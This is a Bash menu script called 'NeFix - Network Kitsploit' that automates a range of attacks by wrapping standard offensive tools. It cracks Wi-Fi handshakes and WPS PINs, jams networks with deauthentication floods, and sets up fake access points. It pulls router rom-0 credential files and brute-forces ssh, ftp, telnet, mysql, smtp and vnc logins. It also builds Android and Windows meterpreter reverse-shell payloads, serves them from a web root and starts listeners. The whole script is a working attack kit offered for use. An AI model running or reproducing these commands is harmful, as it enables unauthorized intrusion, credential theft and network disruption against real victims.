#!/usr/bin/env bash
#
# NeFix - Network Kitsploit
# Copyright © Backbox Indonesia
# Author : koboi
# Contact : fb.com/CBH7.codex
#

p="\033[1;37m"
d="\033[0;37m"
u="\033[0;35m"
m="\033[1;31m"
h="\033[1;32m"
k="\033[1;33m"
b="\033[1;34m"
e="\e[0m"

clear
echo -e "$p  _______________________________________________________________________
[$m                                                                         $p]
[$m                   NeFix v.1.0 beta - Network Kitsploit                  $p]
[$p                         Backbox Linux Indonesia                         $p]
[$b                        Social Enginering Edition                        $p]
[$p _______________________________________________________________________ ]
[
[$h Method..$p
[$k 1.$d Wireless bruteforce (handshake) $p
[$k 2.$d Wireless pin attack (security on) $p
[$k 3.$d Destroy ESSID $p
[$k 4.$d Fake AP/ESSID $p
[$k 5.$d Router exploit rom-0 TP-Link, ZTE, ZynOS, Huawei $p
[$k 6.$d OS Remote $p
[$k 7.$d Server bruteforce $p
[$k 8.$d Password generator $p
[$k 9.$d Mac changer""$e"
echo -ne "$p[$m ? $p]$d Chose method $k(1-9)$d : "
read METOD

if [[ "$METOD" == "1" ]]; then
	echo -e "$p[$d Turning on interfaces.."
	sleep 1
	xterm -geometry 96x25+0+0 -title "Turning on interfaces.." -e screen -c start.rc
	sleep 1
	airodump-ng -w record mon0
	echo -ne "$p[$m ! $p]$d Password file $b(ENTER = default)$d : "
	read PAS
	if [[ "$PAS" == "" ]]; then
		aircrack-ng record-01.cap -w pass.txt
	else
		aircrack-ng record-01.cap -w $PAS
	fi
	echo -e "$p[$d Capture saved to$h /root/dump.cap .."
	mv record-01.cap /root/dump.cap
	echo -e "$p[$d Deleting dump.."
	rm *.csv & rm *.netxml
	echo -e "$p[$d Turning off interfaces.."
	sleep 1
	xterm -geometry 96x25+0+0 -title "Turning off interfaces.." -e screen -c stop.rc
	echo -e "$p[$h ! $p]$d Done.."
fi

if [[ "$METOD" == "2" ]]; then
	echo -e "$p[$d Turn on interfaces.."
	sleep 1
	xterm -geometry 96x25+0+0 -title "Turn on interfaces.." -e screen -c start.rc
	echo -e "$p[$d Get ESSID Info.."
	sleep 1	
	xterm -geometry 96x25-0+0 -title "Get SSID Info.." -e airodump-ng -w record mon0
	echo -ne "$p[$m ? $p]$d ESSID Name : "
	read SID
	echo -e "$p[$d Now playing.."
	sleep 1
	reaver -i mon0 -b $(echo "$(cat record-01.csv | cut -d "," -f1,14 | grep "$SID" | cut -d "," -f1)") -vv -a
	echo -e "$p[$d Removing dump.."
	sleep 1
	rm *.csv
	rm *.cap
	rm *.netxml
	echo -e "$p[$d Turning off interfaces.."
	sleep 1
	xterm -geometry 96x25+0+0 -title "Turning off interfaces" -e screen -c stop.rc
	echo -e "$p[$h ! $p]$d Done.."
fi

if [[ "$METOD" == "3" ]]; then
	echo -e "$p[$d Turning on interfaces.."
	sleep 1
	xterm -geometry 96x25+0+0 -title "Turning on interfaces.." -e screen -c start.rc
	echo -e "$p[$d Get ESSID Info.."
	xterm -geometry 96x25-0+0 -title "Get ESSID Info.." -e airodump-ng -w record mon0
	echo -ne "$p[$m ? $p]$d ESSID Name : "
	read SID
	echo -e "$p[$k 1.$d aireplay-ng"
	echo -e "$p[$k 2.$d mdk3"
	echo -ne "$p[$m ? $p]$d Chose tools $k(1-2)$d : "
	read TOOL
	echo -e "$p[$d Now playing.."
	if [[ "$TOOL" == "1" ]]; then
		xterm -geometry 96x25-0+0 -title "Destroying ESSID.." -e aireplay-ng --deauth 0 -a $(echo "$(cat record-01.csv | cut -d "," -f1,14 | grep "$SID" | cut -d "," -f1)") --ignore-negative-one mon0
	fi
	if [[ "$TOOL" == "2" ]]; then
		echo "$(cat record-01.csv | cut -d "," -f1,14 | grep "$SID" | cut -d "," -f1)" > block.txt
		xterm -geometry 96x25-0+0 -title "Destroying ESSID.." -e mdk3 mon0 d -b block.txt
	fi
	echo -e "$p[$d Deleting dump.."
	rm *.csv
	rm *.cap
	rm *.netxml
	sleep 1
	echo -e "$p[$d Turning off interfaces.."
	xterm -geometry 96x25+0+0 -title "Turning off interfaces.." -e screen -c stop.rc
	echo -e "$p[$h ! $p]$d Done.."
fi

if [[ "$METOD" == "4" ]]; then
	echo -e "$p[$k 1.$d Single access point"
	echo -e "$p[$k 2.$d More access point"
	echo -ne "$p[$m ? $p]$d Chose $h(1-2)$d : "
	read JUMLAH
	if [[ "$JUMLAH" == "1" ]]; then
		echo -ne "$p[$m ? $p]$d Fake ESSID name $m(without space)$d : "
		read PALSU
		echo -e "$p[$k 1.$d None"
		echo -e "$p[$k 2.$d WEP"
		echo -e "$p[$k 3.$d WPA"
		echo -e "$p[$k 4.$d WPA2"
		echo -ne "$p[$m ? $p]$d ESSID Type $m(1-4)$d : "
		read TYPE
		echo -ne "$p[$m ? $p]$d Channel $b(1-99)$d : "
		read CH
		echo -e "$p[$d Turning on interfaces.."
		xterm -geometry 96x25+0+0 -title "Turning on interfaces.." -e screen -c start.rc
		echo -e "$p[$d Create fake ESSID.."
		echo -e "$p[$d Now playing.."
		if [[ "$TYPE" == "1" ]]; then
			echo 'startup_message off' >> temp.rc
			echo 'caption always "%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c"' >> temp.rc
			echo 'screen -t None airbase-ng -a 00:33:11:33:33:77 -c <CH> --essid <PALSU> mon1' >> temp.rc
			echo 'screen -t Monitoring airodump-ng -w record --channel <CH> mon0' >> temp.rc
			sed "s/<PALSU>/$PALSU/" temp.rc | sed "s/<CH>/$CH/" > screen.rc
			xterm -geometry 96x25-0+0 -title "Monitoring ESSID.." -e screen -c screen.rc
		fi
		if [[ "$TYPE" == "2" ]]; then
			echo 'startup_message off' >> temp.rc
			echo 'caption always "%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c"' >> temp.rc
			echo 'screen -t WEP airbase-ng -a 00:33:11:33:33:77 -c <CH> --essid <PALSU> -W 1 mon1' >> temp.rc
			echo 'screen -t airodump airodump-ng -w record --channel <CH> mon0' >> temp.rc
			sed "s/<PALSU>/$PALSU/" temp.rc | sed "s/<CH>/$CH/" > screen.rc
			xterm -geometry 96x25-0+0 -title "Monitoring ESSID.." -e screen -c screen.rc
		fi
		if [[ "$TYPE" == "3" ]]; then
			echo 'startup_message off' >> temp.rc
			echo 'caption always "%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c"' >> temp.rc
			echo 'screen -t WPA airbase-ng -a 00:33:11:33:33:77 -c <CH> --essid <PALSU> -W 1 -z 2 mon1' >> temp.rc
			echo 'screen -t airodump airodump-ng -w record --channel <CH> mon0' >> temp.rc
			sed "s/<PALSU>/$PALSU/" temp.rc | sed "s/<CH>/$CH/" > screen.rc
			xterm -geometry 96x25-0+0 -title "Monitoring ESSID.." -e screen -c screen.rc
		fi
		if [[ "$TYPE" == "4" ]]; then
			echo 'startup_message off' >> temp.rc
			echo 'caption always "%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c"' >> temp.rc
			echo 'screen -t WPA2 airbase-ng -a 00:33:11:33:33:77 -c <CH> --essid <PALSU> -W 1 -Z 4 mon1' >> temp.rc
			echo 'screen -t airodump airodump-ng -w record --channel <CH> mon0' >> temp.rc
			sed "s/<PALSU>/$PALSU/" temp.rc | sed "s/<CH>/$CH/" > screen.rc
			xterm -geometry 96x25-0+0 -title "Monitoring ESSID.." -e screen -c screen.rc
		fi
		echo -e "$p[$d Deleting dump.."
		rm *.csv & rm *.netxml & rm temp.rc & rm screen.rc
		sleep 1
		echo -e "$p[$d Capture saved to$h /root/dump.cap.."
		mv record-01.cap /root/dump.cap
		sleep 1
		echo -e "$p[$d Turning off interfaces.."
		xterm -geometry 96x25+0+0 -title "Turning off interfaces.." -e screen -c stop.rc
	fi

	if [[ "$JUMLAH" == "2" ]]; then
		while true; do
			echo -ne "$p[$m ? $p]$d ESSID Name $h(x = end)$d : ";
			read APS
			if [ "$APS" == "x" ]; then
				break
			else
				echo $APS >> lis.txt
			fi
		done
		echo -e "$p[$d Turning on interfaces.."
		xterm -geometry 96x25+0+0 -title "Turning on interfaces.." -e screen -c start.rc
		echo -e "$p[$d Now playing.."
		xterm -geometry 96x25-0+0 -title "Monitoring fake ESSID.." -e mdk3 mon0 b -f lis.txt
		echo -e "$p[$d Deleting dump"
		rm lis.txt
		sleep 1
		echo -e "$p[$d Turning off interfaces.."
		xterm -geometry 96x25+0+0 -title "Turning off interfaces.." -e screen -c stop.rc
	fi
	echo -e "$p[$h ! $p]$d Done.."
fi

if [[ "$METOD" == "5" ]]; then
	echo -ne "$p[$m ? $p]$d Input IP router : "
	read ROUTE
	echo -e "$p[$d Download file rom-0.."
	xterm -title "Download file" -e wget $ROUTE/rom-0
	echo -e "$p[$d Decompress file rom-0.."
	python r0d.py
	rm rom-0
	echo -e "$p[$h ! $p]$d Done.."
fi

if [[ "$METOD" == "6" ]]; then
	echo -e "$p[$k 1.$d Android"
	echo -e "$p[$k 2.$d Windows"
	echo -ne "$p[$m ? $p]$d Chose system $h(1-2)$d : "
	read SYS
	if [[ "$SYS" == "1" ]]; then
		echo -ne "$p[$m ? $p]$d LHOST : "
		read LHOST
		echo -ne "$p[$m ? $p]$d File name $h(.apk)$d : "
		read NAME
		echo -ne "$p[$d The game will be start..";echo
		msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=$LHOST -o /var/www/$NAME
		msfconsole -q -x "use exploit/multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST $LHOST;exploit"
	fi

	if [[ "$SYS" == "2" ]]; then
		echo -ne "$p[$m ? $p]$d LHOST : "
		read LHOST
		echo -ne "$p[$m ? $p]$d File name $h(.exe)$d : "
		read NAME
		echo -ne "$p[$d The game will be start..";echo
		msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$LHOST -b "\x00" -f exe -o /var/www/$NAME
		msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST $LHOST;set ExitOnSession false;exploit -j -z"
	fi
	echo -e "$p[$h ! $p]$d Done.."
fi

if [[ "$METOD" == "7" ]]; then
	echo -ne "$p[$m ? $p]$d Target : "
	read HOST
	echo -ne "$p[$m ? $p]$d User : "
	read USER
	echo -ne "$p[$m ? $p]$d Password file $b(ENTER = default)$d : "
	read PASS
	if [[ "$PASS" == "" ]]; then
		PASS="pass.txt"
	fi
	echo -e "$p[$k 1.$d ssh"
	echo -e "$p[$k 2.$d ftp"
	echo -e "$p[$k 3.$d telnet"
	echo -e "$p[$k 4.$d mysql"
	echo -e "$p[$k 5.$d smtp"
	echo -e "$p[$k 6.$d vnc"
	echo -ne "$p[$m ? $p]$d Module $m(1-6)$d : "
	read MOD
	if [[ "$MOD" == "1" ]]; then
		medusa -h $HOST -u $USER -P $PASS -M ssh
	fi
	if [[ "$MOD" == "2" ]]; then
		medusa -h $HOST -u $USER -P $PASS -M ftp
	fi
	if [[ "$MOD" == "3" ]]; then
		medusa -h $HOST -u $USER -P $PASS -M telnet
	fi
	if [[ "$MOD" == "4" ]]; then
		medusa -h $HOST -u $USER -P $PASS -M mysql
	fi
	if [[ "$MOD" == "5" ]]; then
		medusa -h $HOST -u $USER -P $PASS -M smtp
	fi
	if [[ "$MOD" == "6" ]]; then
		medusa -h $HOST -u $USER -P $PASS -M vnc
	fi
	echo -e "$p[$h ! $p]$d Done.."
fi

if [[ "$METOD" == "8" ]]; then
	bash generate.sh
	echo -e "$p[$h ! $p]$d Done.."
fi

if [[ "$METOD" == "9" ]]; then
	echo -ne "$p[$m ? $p]$d Interface (ex =$m wlan0$d) : "
	read IFACE
	echo -e "$p[$m ! $p]$d Current :$h $(ifconfig $IFACE | awk '/HWaddr/ {print $5}')"
	echo -ne "$p[$m ? $p]$d New mac :$h $(ifconfig $IFACE | awk '/HWaddr/ {print $5}' | cut -c1-8):"
	read MAC
	ifconfig $IFACE down
	ifconfig $IFACE hw ether $(ifconfig $IFACE | awk '/HWaddr/ {print $5}' | cut -c1-8):$MAC
	ifconfig $IFACE up
	echo -e "$p[$m ! $p]$d Last mac:$h $(ifconfig $IFACE | awk '/HWaddr/ {print $5}')""$e"
	echo -e "$p[$h ! $p]$d Done.."
fi